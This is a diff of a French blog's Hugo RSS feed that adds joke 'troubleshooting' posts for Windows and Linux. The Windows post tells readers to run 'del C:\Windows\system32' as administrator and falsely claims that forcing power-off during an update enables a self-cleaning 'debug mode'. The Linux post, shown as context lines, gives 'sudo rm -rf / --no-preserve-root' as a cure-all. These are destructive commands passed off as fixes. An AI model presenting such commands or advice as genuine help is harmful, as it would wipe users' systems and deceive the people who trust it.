@@ -6,19 +6,38 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>fr-fr</language>
     <copyright>©2019 Madame Fertig.</copyright>
-    <lastBuildDate>Tue, 09 Mar 2021 11:43:01 +0100</lastBuildDate>
+    <lastBuildDate>Tue, 09 Mar 2021 12:50:58 +0100</lastBuildDate>
     
         <atom:link href="https://frais64.github.io/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
-      <title>First</title>
-      <link>https://frais64.github.io/test/first/</link>
+      <title>Résoudre Problèmes Avec Windows</title>
+      <link>https://frais64.github.io/informatique/r%C3%A9soudre-probl%C3%A8mes-avec-windows/</link>
+      <pubDate>Tue, 09 Mar 2021 12:50:58 +0100</pubDate>
+      
+      <guid>https://frais64.github.io/informatique/r%C3%A9soudre-probl%C3%A8mes-avec-windows/</guid>
+      <description>&lt;h2 id=&#34;résoudre-problèmes-avec-windows-pas-à-pas-ez-tutorial-2021-working-100-safe&#34;&gt;Résoudre Problèmes Avec Windows (pas à pas, EZ tutorial 2021 WORKING 100% safe!!!!!!)&lt;/h2&gt;
+&lt;p&gt;Nous avons tous été touché au moins une fois par les problèmes de notre cher Windows, malgré le travail acharné de la firme de Redmond pour intégrer le meilleur spyware possible sur nos ordinateurs. C&amp;rsquo;est pour cela que je vais vous proposer quelques solutions miracle pour vous aider a résoudre tous vos problèmes.&lt;/p&gt;
+&lt;h3 id=&#34;la-solution-software&#34;&gt;La solution &amp;ldquo;software&amp;rdquo;&lt;/h3&gt;
+&lt;p&gt;Cette solution utilise la puissance des outils préintégrés dans notre cher Fenêtre. Ouvrez powershell en mode administrateur et entrez:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nb&#34;&gt;del &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system32&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ceci va résoudre tout vos soucis tout en désactivant tout les spywares! Essayer le!&lt;/p&gt;
+&lt;h3 id=&#34;la-solution-finale-aka-la-solution-hardware&#34;&gt;La solution finale a.k.a la solution &amp;ldquo;hardware&amp;rdquo;&lt;/h3&gt;
+&lt;p&gt;Il peut arriver que la solution software ne fonctionne pas avec votre version de Windows, ne vous inquiétez pas! Vous pouvez appliquer la méthode suivante!
+Quand Windows vous indique qu&amp;rsquo;il effectue un mise a jour, appuyer pendant une dizaine de secondes sur le bouton d&amp;rsquo;alimentation de votre ordinateur. Cela va activer le &amp;ldquo;mode debug&amp;rdquo; qui va automatiquement faire un &amp;ldquo;cleanup&amp;rdquo; de votre système.
+Une fois dans le mode debug, essayer la solution &amp;ldquo;software&amp;rdquo; a nouveau, celle-ci devrait marcher correctement dans ce mode.&lt;/p&gt;
+&lt;p&gt;Merci a Tom pour m&amp;rsquo;avoir présenté cette superbe technique.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Résoudre les problèmes avec linux.</title>
+      <link>https://frais64.github.io/informatique/r%C3%A9soudre-les-probl%C3%A8mes-avec-linux/</link>
       <pubDate>Tue, 09 Mar 2021 11:43:01 +0100</pubDate>
       
-      <guid>https://frais64.github.io/test/first/</guid>
-      <description>&lt;h1 id=&#34;yo-les-cristaux&#34;&gt;Yo les cristaux!&lt;/h1&gt;
-&lt;h2 id=&#34;comment-résoudre-tout-les-problèmes-avec-un-système-linux&#34;&gt;Comment résoudre tout les problèmes avec un système linux&lt;/h2&gt;
+      <guid>https://frais64.github.io/informatique/r%C3%A9soudre-les-probl%C3%A8mes-avec-linux/</guid>
+      <description>&lt;h2 id=&#34;comment-résoudre-tout-les-problèmes-avec-un-système-linux&#34;&gt;Comment résoudre tout les problèmes avec un système linux&lt;/h2&gt;
 &lt;p&gt;Entrez cette commande dans votre terminal:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo rm -rf / --no-preserve-root
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;C&amp;rsquo;est la vraie panacée pour votre ordinateur! tkt mm pas.&lt;/p&gt;
